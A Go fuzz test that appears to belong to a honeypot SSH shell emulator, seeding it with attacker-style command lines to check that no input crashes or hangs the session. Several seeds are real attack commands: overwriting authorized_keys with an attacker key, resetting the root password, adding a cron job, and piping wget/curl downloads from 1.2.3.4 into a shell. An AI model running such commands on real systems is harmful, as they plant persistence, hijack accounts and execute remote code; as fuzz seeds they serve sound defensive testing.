package shell_test

import (
	"testing"

	"github.com/antonmedv/ssham/internal/shelltest"
)

// FuzzShell feeds arbitrary command lines to a session. Attackers send
// whatever they like, so no input may crash a command (a panic is logged as
// a "panic" event) or hang. Run with: go test ./internal/shell -fuzz FuzzShell
func FuzzShell(f *testing.F) {
	for _, seed := range []string{
		"uname -a; cat /proc/cpuinfo | grep name | wc -l",
		"cd ~ && rm -rf .ssh && mkdir .ssh && echo 'ssh-rsa AAAA' >> .ssh/authorized_keys && chmod -R go= ~/.ssh",
		"echo \"root:x\" | chpasswd | bash",
		"(crontab -l; echo '* * * * * x') | crontab -",
		"wget -qO- http://1.2.3.4/x | sh; curl -fsSL 1.2.3.4 | bash",
		"echo $((1+2*3)) ${X:-y} ${#HOME} $(echo `echo a`) ~root/*",
		"a=1 b=2 env | sort | head -n 1 > /tmp/x 2>&1 &",
		"echo 'unterminated", "echo $(", "echo ${", "$((", "|", "&&", ";;", "( ( (", "\\", "'\"`",
		"printf '%s %d %q %' a b", "sed 's/(/)/g' /etc/passwd", "grep -E '(' /etc/passwd",
		"awk '{print $99999999999}' /etc/passwd", "seq 1 2 99999999999999999999",
		"head -n -5 /etc/passwd", "tail -c +0 /dev/null", "cut -f 0 /etc/passwd", "tr '' ''",
		"sudo su -c 'exit 3'; exit 1", "sh -c 'sh -c \"sh -c exit\"'",
	} {
		f.Add(seed)
	}
	f.Fuzz(func(t *testing.T, line string) {
		s := shelltest.New(t, "admin")
		s.Exec(line)
		s.Run(line, "password")
		if ev := s.Events("panic"); len(ev) > 0 {
			t.Fatalf("%q panicked: %v", line, ev[0]["panic"])
		}
	})
}
